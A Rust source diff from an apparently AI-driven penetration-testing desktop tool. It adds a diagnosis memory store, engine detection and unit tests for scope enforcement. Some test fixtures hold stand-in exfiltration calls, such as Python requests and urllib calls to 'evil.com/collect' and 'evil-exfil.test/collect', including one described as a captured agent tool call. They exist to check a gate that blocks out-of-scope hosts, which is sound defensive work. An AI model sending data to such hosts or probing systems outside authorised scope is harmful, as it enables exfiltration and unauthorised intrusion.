+        let removed = app.state::<Procs>().0.lock().unwrap().remove(&k);
+        if let Some(mut child) = removed {
+            let _ = child.kill();
+            let _ = child.wait();
+        }
+    }
 
     let ev = json!({ "type": "note", "text": "[중지] 사용자가 실행을 중지했습니다." });
     let stamped = append_event(&app, &id, &ev);
@@ -1449,6 +2875,186 @@ fn sanitize_filename(raw: &str) -> String {
 }
 
 /// host 를 DNS 해석해 나온 IP 를 인가 목록에 추가한다. 반환: (새로 추가한 IP, 이미 있던 IP).
+// ── 진단 메모리(harness memory) — prime-agent Continual Harness 패턴의 경량 구현 ──
+// 전역 메모 + 대상별 메모를 앱 데이터 memory.json 에 누적하고, 진단 지시문에 주입한다.
+// kind: note(사용자 메모) | history(심층 진단 이력 자동 기록) | fix(조치 확인됨).
+#[derive(Serialize, Deserialize, Clone)]
+struct MemoryNote {
+    id: String,
+    ts: String,
+    #[serde(default)]
+    host: String, // 빈 문자열 = 전역
+    #[serde(default)]
+    kind: String,
+    text: String,
+}
+
+fn memory_file(app: &AppHandle) -> PathBuf {
+    root(app).join("memory.json")
+}
+
+fn load_memory(app: &AppHandle) -> Vec<MemoryNote> {
+    fs::read_to_string(memory_file(app))
+        .ok()
+        .and_then(|t| serde_json::from_str(&t).ok())
+        .unwrap_or_default()
+}
+
+fn save_memory(app: &AppHandle, notes: &[MemoryNote]) {
+    if let Ok(txt) = serde_json::to_string_pretty(notes) {
+        fs::write(memory_file(app), txt).ok();
+    }
+}
+
+/// 진단 지시문에 주입하는 메모리 블록 (전역 + 해당 대상, 최신 8건, 건당 300자).
+fn memory_block(app: &AppHandle, host: &str) -> String {
+    let notes = load_memory(app);
+    let host = host.trim().to_lowercase();
+    let picked: Vec<&MemoryNote> = notes
+        .iter()
+        .filter(|n| n.host.trim().is_empty() || (!host.is_empty() && n.host.trim().to_lowercase() == host))
+        .collect();
+    if picked.is_empty() {
+        return String::new();
+    }
+    let mut out = String::from("## 과거 진단 메모 (이번 진단에 반영할 것)\n");
+    for n in picked.iter().rev().take(8) {
+        let t: String = n.text.chars().take(300).collect();
+        out.push_str(&format!("- [{}] {}\n", n.kind, t.trim()));
+    }
+    out
+}
+
+/// 심층 진단 완료 후 이력 1줄 자동 기록 (대상별 history 5건·전체 300건 상한).
+fn record_history(app: &AppHandle, host: &str, ok_n: usize, total: usize, ok: bool) {
+    let guard = app.state::<IoGuard>();
+    let _lock = guard.0.lock().unwrap();
+    let mut notes = load_memory(app);
+    // 같은 대상 history 는 최근 4건만 남긴다.
+    let mut kept_hist: Vec<MemoryNote> = notes
+        .iter()
+        .filter(|n| n.kind == "history" && n.host == host)
+        .cloned()
+        .collect();
+    kept_hist.sort_by(|a, b| b.ts.cmp(&a.ts));
+    kept_hist.truncate(4);
+    notes.retain(|n| !(n.kind == "history" && n.host == host));
+    notes.extend(kept_hist);
+    let day = now().chars().take(10).collect::<String>();
+    notes.push(MemoryNote {
+        id: Uuid::new_v4().to_string(),
+        ts: now(),
+        host: host.to_string(),
+        kind: "history".into(),
+        text: format!(
+            "심층진단 {day} — 워커 {ok_n}/{total} 성공, 리포트 병합 {}.",
+            if ok { "성공" } else { "실패" }
+        ),
+    });
+    // 전체 상한: 오래된 history 부터 제거.
+    while notes.len() > 300 {
+        if let Some(pos) = notes.iter().position(|n| n.kind == "history") {
+            notes.remove(pos);
+        } else {
+            break;
+        }
+    }
+    save_memory(&app, &notes);
+}
+
+#[tauri::command]
+fn get_memory(app: AppHandle, host: String) -> Value {
+    let notes = load_memory(&app);
+    let h = host.trim().to_lowercase();
+    let global: Vec<&MemoryNote> = notes.iter().filter(|n| n.host.trim().is_empty()).collect();
+    let mine: Vec<&MemoryNote> =
+        notes.iter().filter(|n| !n.host.trim().is_empty() && n.host.trim().to_lowercase() == h).collect();
+    json!({ "global": global, "host": mine })
+}
+
+#[tauri::command]
+fn add_memory(app: AppHandle, host: String, kind: String, text: String) -> Result<Value, String> {
+    let text = text.trim();
+    if text.is_empty() {
+        return Err("메모 내용을 입력하세요.".into());
+    }
+    if text.chars().count() > 2000 {
+        return Err("메모는 2000자 이내로 입력하세요.".into());
+    }
+    let kind = match kind.trim() {
+        "note" | "fix" | "history" => kind.trim().to_string(),
+        "" => "note".to_string(),
+        other => return Err(format!("알 수 없는 메모 종류: {other}")),
+    };
+    let guard = app.state::<IoGuard>();
+    let _lock = guard.0.lock().unwrap();
+    let mut notes = load_memory(&app);
+    notes.push(MemoryNote {
+        id: Uuid::new_v4().to_string(),
+        ts: now(),
+        host: host.trim().to_string(),
+        kind,
+        text: text.to_string(),
+    });
+    save_memory(&app, &notes);
+    Ok(json!({ "ok": true, "count": notes.len() }))
+}
+
+#[tauri::command]
+fn remove_memory(app: AppHandle, id: String) -> Result<Value, String> {
+    let guard = app.state::<IoGuard>();
+    let _lock = guard.0.lock().unwrap();
+    let mut notes = load_memory(&app);
+    let before = notes.len();
+    notes.retain(|n| n.id != id);
+    if notes.len() == before {
+        return Err("메모를 찾을 수 없습니다.".into());
+    }
+    save_memory(&app, &notes);
+    Ok(json!({ "ok": true, "count": notes.len() }))
+}
+
+/// prime-agent 버전 조회 — `--version` 첫 줄 (3초 타임아웃).
+fn prime_version(bin: &Path) -> Option<String> {
+    let mut probe = Command::new(bin);
+    probe.arg("--version").stdout(Stdio::piped()).stderr(Stdio::null());
+    hide_window(&mut probe);
+    let mut child = probe.spawn().ok()?;
+    let mut waited = 0;
+    loop {
+        if child.try_wait().ok()??.success() {
+            use std::io::Read;
+            let mut out = String::new();
+            if let Some(mut o) = child.stdout.take() {
+                let _ = o.read_to_string(&mut out);
+            }
+            let v = out.lines().next().unwrap_or("").trim().to_string();
+            return if v.is_empty() { None } else { Some(v) };
+        }
+        std::thread::sleep(std::time::Duration::from_millis(100));
+        waited += 100;
+        if waited > 3000 {
+            let _ = child.kill();
+            return None;
+        }
+    }
+}
+
+/// 엔진 감지 — pi-coding-agent + prime-agent(Rust 하네스 직접 실행) 설치 상태·버전.
+#[tauri::command]
+fn detect_engines(app: AppHandle) -> Value {
+    let settings = get_settings(app);
+    let pi = prime_cli_path(&settings.redcell_dir)
+        .map(|p| p.to_string_lossy().into_owned())
+        .ok();
+    let prime_path = prime_agent_path().ok();
+    let prime_version = prime_path.as_deref().and_then(prime_version);
+    json!({
+        "pi": { "found": pi.is_some(), "path": pi },
+        "prime_agent": { "found": prime_path.is_some(), "path": prime_path.map(|p| p.to_string_lossy().into_owned()), "version": prime_version },
+    })
+}
+
 fn main() {
     tauri::Builder::default()
         .manage(IoGuard(Mutex::new(())))
@@ -1460,10 +3066,16 @@ fn main() {
             get_session,
             create_session,
             update_session,
+            set_danger_consent,
             delete_session,
             append_chat,
             start_engagement,
+            start_deep_diagnosis,
             stop_engagement,
+            get_memory,
+            add_memory,
+            remove_memory,
+            detect_engines,
             list_auth,
             add_auth,
             remove_auth,
@@ -1638,5 +3250,259 @@ mod tests {
                 None => std::env::remove_var(k),
             }
         }
+    }
+
+    /// pi 1.3.0 정식 진입점 우선: dist/bundle/cli.js 와 dist/cli.js 가 둘 다 있으면
+    /// bundle 을 선택하고, bundle 만 없을 때 구 경로로 폴백한다.
+    #[test]
+    fn prime_cli_path_prefers_bundle_entry() {
+        let _g = ENV_LOCK.lock().unwrap();
+        let saved = [
+            ("REDCELL_PI_DIR", std::env::var_os("REDCELL_PI_DIR")),
+            ("PI_PACKAGE_DIR", std::env::var_os("PI_PACKAGE_DIR")),
+        ];
+        let fake = std::env::temp_dir().join(format!("redcell-bundle-{}", std::process::id()));
+        let bundle = fake.join("dist").join("bundle").join("cli.js");
+        let legacy = fake.join("dist").join("cli.js");
+        std::fs::create_dir_all(bundle.parent().unwrap()).unwrap();
+        std::fs::write(&bundle, "// bundle cli").unwrap();
+        std::fs::write(&legacy, "// legacy cli").unwrap();
+        std::env::set_var("REDCELL_PI_DIR", &fake);
+        std::env::remove_var("PI_PACKAGE_DIR");
+        let found = prime_cli_path("C:\\workspace\\redcell").expect("REDCELL_PI_DIR 설치를 찾아야 한다");
+        assert_eq!(found, bundle, "bundle 진입점이 우선이어야 한다: {found:?}");
+        // bundle 삭제 → 구 경로 폴백.
+        std::fs::remove_file(&bundle).unwrap();
+        let found2 = prime_cli_path("C:\\workspace\\redcell").expect("구 경로로 폴백해야 한다");
+        assert_eq!(found2, legacy, "bundle 이 없으면 dist/cli.js 로 폴백: {found2:?}");
+        std::fs::remove_dir_all(&fake).ok();
+        for (k, v) in saved {
+            match v {
+                Some(v) => std::env::set_var(k, v),
+                None => std::env::remove_var(k),
+            }
+        }
+    }
+
+    /// tool_execution_end 요약: content 첫 텍스트를 한 줄로, 없으면 details.
+    #[test]
+    fn tool_result_summary_shapes() {
+        let ev = serde_json::json!({
+            "result": { "content": [{ "type": "text", "text": "200 OK\nnginx/1.24" }], "details": {} }
+        });
+        assert_eq!(tool_result_summary(&ev), " — 200 OK nginx/1.24");
+        let ev2 = serde_json::json!({ "result": { "content": [], "details": { "code": 404 } } });
+        assert!(tool_result_summary(&ev2).contains("404"), "details 폴백: {}", tool_result_summary(&ev2));
+        let ev3 = serde_json::json!({});
+        assert_eq!(tool_result_summary(&ev3), "");
+    }
+
+    /// 심층 워커 정의: 5개 분야, id/label/title/brief 완비, 지시문 자족성.
+    #[test]
+    fn deep_workers_five_vectors() {
+        assert_eq!(DEEP_WORKERS.len(), 5, "워커는 5개 분야여야 한다");
+        for def in DEEP_WORKERS {
+            assert!(!def.id.is_empty() && !def.label.is_empty() && !def.title.is_empty() && !def.brief.is_empty());
+            let inst = deep_worker_instruction(def, "http://t/", "쇼핑몰", "", "");
+            assert!(inst.contains(def.title), "지시문에 분야 명시: {}", def.id);
+            assert!(inst.contains("web_fetch"), "웹 조회 수단 명시: {}", def.id);
+            assert!(inst.contains("## 워커 발견"), "출력 형식 명시: {}", def.id);
+        }
+        let merge = deep_merge_instruction("http://t/", "", "--- W1 ---\n- [높음] x", "");
+        assert!(merge.contains("collector"), "병합자 역할 명시");
+        assert!(merge.contains("### 루트 1"), "리포트 형식 포함");
+        assert!(merge.contains("멘토 노트"), "멘토 노트 라벨 포함");
+    }
+
+    /// 호스트 추출 — URL 스킴·IPv4·host 계열 필드를 args JSON 에서 수집 (중복 제거).
+    #[test]
+    fn extract_hosts_shapes() {
+        let v = serde_json::json!({"url": "https://demo.vulnlab.local:8443/a?x=1"});
+        assert_eq!(extract_hosts("web_fetch", &v), vec!["demo.vulnlab.local"]);
+        let v = serde_json::json!({"code": "u1=urllib.request.urlopen(\"http://10.0.0.9/x\"); u2=requests.get('https://evil.com/')"});
+        let mut h = extract_hosts("python_repl", &v);
+        h.sort();
+        assert_eq!(h, vec!["10.0.0.9", "evil.com"]);
+        let v = serde_json::json!({"host": "10.1.2.3", "port": 8080});
+        assert_eq!(extract_hosts("recon_http", &v), vec!["10.1.2.3"]);
+        let v = serde_json::json!({"hostname": "Sub.Example.COM"});
+        assert_eq!(extract_hosts("x", &v), vec!["sub.example.com"]);
+        let v = serde_json::json!({"code": "print(40 + 2)"});
+        assert!(extract_hosts("python_repl", &v).is_empty());
+        let v = serde_json::json!({"url": "http://a.local/1", "target": "http://a.local/2"});
+        assert_eq!(extract_hosts("x", &v), vec!["a.local"]); // 중복 제거
+    }
+
+    /// 반응형 게이트 판정 — 인가 안이면 통과(None), 밖이면 위반 사유.
+    #[test]
+    fn decide_tool_violation_cases() {
+        let auth = auth::AuthList {
+            allows: vec!["demo.vulnlab.local".into(), "10.0.0.0/24".into()],
+            denies: vec!["10.0.0.9".into()],
+            ..Default::default()
+        };
+        let ok = serde_json::json!({"code": "urllib.request.urlopen(\"https://demo.vulnlab.local/\")"});
+        assert!(decide_tool_violation(&auth, "python_repl", &ok).is_none());
+        let ok2 = serde_json::json!({"host": "10.0.0.5"});
+        assert!(decide_tool_violation(&auth, "recon_http", &ok2).is_none());
+        let bad = serde_json::json!({"code": "requests.get('https://evil.com/collect')"});
+        let v = decide_tool_violation(&auth, "python_repl", &bad).expect("위반이어야 한다");
+        assert!(v.contains("evil.com"), "위반 사유에 호스트 명시: {v}");
+        let denied = serde_json::json!({"url": "http://10.0.0.9/x"});
+        assert!(decide_tool_violation(&auth, "web_fetch", &denied).is_some(), "deny가 이겨야 한다");
+        let local = serde_json::json!({"code": "print(40 + 2)"});
+        assert!(decide_tool_violation(&auth, "python_repl", &local).is_none(), "대상 없는 호출은 통과");
+        let yaml = auth::AuthList { yaml: true, ..Default::default() };
+        assert!(decide_tool_violation(&yaml, "python_repl", &bad).is_none(), "YAML scope는 해석 불가 — kill 없음(스킬 수준만)");
+    }
+
+    /// prime-agent 실측 이벤트 그대로의 위반 판정 — 실바이너리 캡처 verbatim 픽스처.
+    #[test]
+    fn decide_tool_violation_prime_fixture() {
+        // prime-agent 0.10.0 --mode json 실측 tool_execution_start 전문verbatim.
+        let ev = serde_json::json!({
+            "type": "tool_execution_start", "toolCallId": "call_9",
+            "toolName": "python_repl",
+            "args": {"code": "import urllib.request; print(urllib.request.urlopen(\"http://evil-exfil.test/collect\", timeout=10).status)"}
+        });
+        let auth = auth::AuthList { allows: vec!["demo.vulnlab.local".into()], ..Default::default() };
+        let v = decide_tool_violation(&auth, "python_repl", &ev["args"]).expect("미인가 호스트는 위반");
+        assert!(v.contains("evil-exfil.test"), "{v}");
+    }
+
+    /// 스코프 스킬 생성 — prime-agent --skill 주입용 SKILL.md (frontmatter + scope).
+    #[test]
+    fn write_scope_skill_shape() {
+        let dir = std::env::temp_dir().join(format!("rc-skill-{}", std::process::id()));
+        let p = write_scope_skill(&dir, &["demo.vulnlab.local".into(), "10.0.0.0/24".into()], &["10.0.0.9".into()]).unwrap();
+        let text = std::fs::read_to_string(&p).unwrap();
+        assert!(text.starts_with("---\nname: redcell-scope\n"), "frontmatter 필요:\n{text}");
+        assert!(text.contains("demo.vulnlab.local") && text.contains("10.0.0.0/24"), "허용 목록 포함");
+        assert!(text.contains("10.0.0.9"), "제외 목록 포함");
+        assert!(text.contains("python_repl"), "prime 도구 안내 포함");
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    /// prime-agent 실행 인자 — 바이너리+--mode json+--print+--skill+--session-dir.
+    #[test]
+    fn prime_run_args_shape() {
+        let _g = ENV_LOCK.lock().unwrap();
+        let saved = std::env::var_os("REDCELL_PRIME_BIN");
+        let fake = std::env::temp_dir().join(format!("prime-bin-{}", std::process::id()));
+        std::fs::write(&fake, "#!/bin/sh\necho prime\n").unwrap();
+        std::env::set_var("REDCELL_PRIME_BIN", &fake);
+        let settings = Settings::default();
+        let skill = PathBuf::from("/tmp/x/SKILL.md");
+        let sdir = PathBuf::from("/tmp/x/sess");
+        let (prog, args) = prime_run_args(&settings, "openai", &skill, &sdir, true, "진단해줘".into()).unwrap();
+        assert_eq!(prog, fake);
+        let joined = args.join(" ");
+        for frag in ["--mode", "json", "--print", "--skill", "/tmp/x/SKILL.md", "--session-dir", "/tmp/x/sess", "--continue", "--provider", "openai"] {
+            assert!(args.iter().any(|a| a == frag), "인자 누락: {frag}\n전체: {joined}");
+        }
+        assert!(args.iter().any(|a| a == "진단해줘"), "지시문 포함: {joined}");
+        // --continue 없음 (새 세션).
+        let (_, args2) = prime_run_args(&settings, "openai", &skill, &sdir, false, "x".into()).unwrap();
+        assert!(!args2.iter().any(|a| a == "--continue"), "새 세션에 --continue 금지");
+        std::fs::remove_file(&fake).ok();
+        match saved {
+            Some(v) => std::env::set_var("REDCELL_PRIME_BIN", v),
+            None => std::env::remove_var("REDCELL_PRIME_BIN"),
+        }
+    }
+
+    /// prime-agent models.json 경로 — ~/.prime/agent/models.json.
+    #[test]
+    fn prime_models_json_path_shape() {
+        let _g = ENV_LOCK.lock().unwrap();
+        let saved = [("HOME", std::env::var_os("HOME")), ("USERPROFILE", std::env::var_os("USERPROFILE"))];
+        std::env::set_var("HOME", "/tmp/fakehome");
+        std::env::remove_var("USERPROFILE");
+        let p = prime_models_json_path().unwrap();
+        assert_eq!(p, PathBuf::from("/tmp/fakehome/.prime/agent/models.json"), "{p:?}");
+        for (k, v) in saved {
+            match v {
+                Some(v) => std::env::set_var(k, v),
+                None => std::env::remove_var(k),
+            }
+        }
+    }
+
+    /// 프로바이더 API 호스트 — conn.base_url 우선, 없으면 카탈로그 기본값.
+    #[test]
+    fn provider_api_host_prefers_custom_base() {
+        let settings = Settings::default();
+        assert_eq!(provider_api_host("anthropic", &settings).as_deref(), Some("api.anthropic.com"));
+        assert_eq!(provider_api_host("openai", &settings).as_deref(), Some("api.openai.com"));
+        assert_eq!(provider_api_host("no-such", &settings), None);
+        let mut s2 = Settings::default();
+        s2.providers.insert(
+            "custom".into(),
+            ProviderConn { api_key: String::new(), base_url: "http://llm.local:8080/v1".into(), model: "x".into() },
+        );
+        assert_eq!(provider_api_host("custom", &s2).as_deref(), Some("llm.local"));
+    }
+
+    /// ALLOW/DENY 스펙 조립 — 중복 제거·쓰레기 제거·deny 분리.
+    #[test]
+    fn netfilter_spec_shape() {
+        let allows = vec!["10.0.0.0/8".to_string(), " Example.COM ".to_string(), "".to_string(), "http://x/".to_string()];
+        let denies = vec!["10.9.9.9".to_string()];
+        let extra = vec!["example.com".to_string(), "api.anthropic.com".to_string()];
+        let (allow, deny) = build_netfilter_spec(&allows, &denies, &extra);
+        assert_eq!(allow, "10.0.0.0/8,Example.COM,api.anthropic.com");
+        assert_eq!(deny, "10.9.9.9");
+    }
+
+    /// .so 탐색 — 명시 override 가 깨졌으면 폴백 없이 None (은폐 방지).
+    #[test]
+    fn netfilter_so_override_broken_is_none() {
+        let _g = ENV_LOCK.lock().unwrap();
+        let saved = std::env::var_os("REDCELL_NETFILTER_SO");
+        std::env::set_var("REDCELL_NETFILTER_SO", "/nonexistent-nf-xyz.so");
+        assert_eq!(netfilter_so_path(), None);
+        match saved {
+            Some(v) => std::env::set_var("REDCELL_NETFILTER_SO", v),
+            None => std::env::remove_var("REDCELL_NETFILTER_SO"),
+        }
+    }
+
+    /// 발견 키 추출 — 등급 줄만 정규화·순서 유지·중복 제거.
+    #[test]
+    fn finding_keys_normalize_and_dedup() {
+        let text = "## 워커 발견 (W1·정찰 표면 정찰)\n- [중간] 보안 헤더 누락 — CSP 없음 / 근거: 헤더 원문\n- [중간] 보안 헤더 누락 — CSP 없음 / 근거: 헤더 원문\n잡담 줄은 무시된다\n* [높음] .env 노출 — 키 확인";
+        let keys = extract_finding_keys(text);
+        assert_eq!(keys.len(), 2, "{keys:?}");
+        assert!(keys[0].contains("보안헤더누락"));
+        assert!(keys[1].contains("env노출"));
+    }
+
+    /// 추적 지시문 — 라운드·자가 요약·교차 단서·추가 발견 형식 포함.
+    #[test]
+    fn followup_instruction_shape() {
+        let def = &DEEP_WORKERS[2];
+        let inst = deep_followup_instruction(def, 2, "- [높음] IDOR 신호", "- [단서:w2] sqli", "http://t/");
+        assert!(inst.contains("추적 라운드 2"));
+        assert!(inst.contains("W3·인증"));
+        assert!(inst.contains("IDOR"));
+        assert!(inst.contains("## 추가 발견"));
+        assert!(inst.contains("web_fetch"));
+        // prime 치환 후에도 골격 유지.
+        let pa = prime_adapt(inst);
+        assert!(pa.contains("python_repl+urllib") && pa.contains("## 추가 발견"));
+    }
+
+    /// .so 탐색 — 실행파일 옆 산출물을 찾는다 (build.rs 가 생성).
+    #[test]
+    fn netfilter_so_found_next_to_exe() {
+        let _g = ENV_LOCK.lock().unwrap();
+        let saved = std::env::var_os("REDCELL_NETFILTER_SO");
+        std::env::remove_var("REDCELL_NETFILTER_SO");
+        let found = netfilter_so_path();
+        match saved {
+            Some(v) => std::env::set_var("REDCELL_NETFILTER_SO", v),
+            None => std::env::remove_var("REDCELL_NETFILTER_SO"),
+        }
+        assert!(found.map(|p| p.is_file()).unwrap_or(false), "build.rs 산출물 미발견");
     }
 }
